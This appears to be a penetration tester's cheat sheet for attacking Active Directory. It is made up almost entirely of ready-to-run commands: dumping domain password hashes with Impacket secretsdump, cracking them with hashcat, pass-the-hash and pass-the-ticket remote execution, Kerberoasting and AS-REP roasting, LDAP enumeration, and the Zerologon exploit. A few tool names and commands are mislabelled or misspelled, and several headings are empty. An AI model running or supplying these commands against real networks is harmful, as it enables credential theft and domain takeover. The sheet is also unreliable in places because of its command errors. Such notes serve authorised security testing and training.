# Active Directory Exploitation  
## NTLM Authentication
### Impacket Scripts  
psexec.py, smbexec.py, wmiexec.py   
If you have creds for the backup account for domain controller: can dump all hashes    

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
    
Use secretsdump.py to dump hashes and hash history from Active Directory database (NTDS.dit) and the SYSTEM registry hive. Password history can be helpful for password reuse attacks.            

    python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile dc-hashes -history     
    sed -i '/$:/d' dc-hashes.ntds     #remove machine accounts (end with $:)     
    hashcat -m 1000 -a 0 dc-hashes.ntds ~/path_to_wordlist   #crack NT hashes with a wordlist attack      
    
Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    

    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]   

## Kerberos (Port 88)   
Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
[Messing With Kerberos Using Rubeus](https://endark.gitbook.io/kb/windows/lab-attacks/messing-with-kerberos-using-rubeus) 
[Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
[Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  
[How Kerberos Works](https://www.tarlogic.com/blog/how-kerberos-works/)  


    ./kerbrute userenum userlist.txt -d [name] --dc [name]     
    
## Kerberos Attacks 

Kerbrute Enumeration (No domain access needed) 

Kerberoasting (Access as any user needed) 

AS-REP Roasting with Rubeus and Impacket (Access as any user needed)  

Overpass the Hash / Pass the Key (PTK)  

Pass the Ticket (Access to user on the domain needed)  

Golden/Silver Ticket Attacks (Domain admin needed / Service hash needed) 

Skeleton key attacks using mimikatz (Domain Admin needed) 

### Kerbrute Enumeration 
No domain access needed 

Kerbrute: https://github.com/ropnop/kerbrute
/usr/share/wordlists/ADUsers.txt

### Kerberoasting  
Check for Kerberoasting with Impacket -> SPNs 

    GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john

Kerberoasting with Impacket

    python3 GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  
    sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <ip> -request
     
 Kerberoasting with Rubeus (install on Windows host in domain) 
 
    rubeus.exe kerberoast 
 
Crack passwords with hashcat 

    hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/ADPass.txt
    13100: kerberos 5, 0: straight attack mode

### AS-REP Roasting with Rubeus and Impacket
Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
     

ASREPRoast with Impacket:

    impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
    impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

ASREP Roast with Rubeus:

### Golden / Silver Ticket Attacks: 

### Overpass The Hash/Pass The Key (PTK):
Impacket 

    python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
    python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
    python3 getTGT.py <domain_name>/<user_name>:[password]

### Pass the Ticket 
Using TGT key to execute remote commands from the following impacket scripts:

    python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
    python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
    python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

### Skeleton Key Attacks using Mimikatz 

## LDAP (Port 636)
Anonymous Credential LDAP Dumping: 

    ldapsearch -LLL -x -H ldap://<domain fqdn> -b '' -s base '(objectclass=*)'

Impacket GetADUsers.py (Must have valid credentials)

    GetADUsers.py -all <domain\User> -dc-ip <DC_IP>

Impacket lookupsid.py:

    /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

Impacket Secretdump:

    python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin

Windapsearch:

https://github.com/ropnop/windapsearch 

    python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
    
## Other Exploits
[Print Nightmare Walkthrough](https://themayor.notion.site/341cf3705cc64752b466046584de45b8?v=4f2173ad749249b293a89ab5391805ec&p=ef69c17e82c5471fb4648ccabbf5c937) 
impersonate DA from standard domain user   
https://github.com/WazeHell/sam-the-admin   

Zerologon    
Testing script, use cme to extract the DC name.    
https://github.com/SecuraBV/CVE-2020-1472    

    python3 zerologon_tester.py EXAMPLE-DC 1.2.3.4    
Use zer0dump to dump hash of admin password:  
 
    zer0dump.py 192.168.0.5 -port 445    
RCE through pass the hash: 

    psexec.py -hashes [hash] Administrator@192.168.0.5   
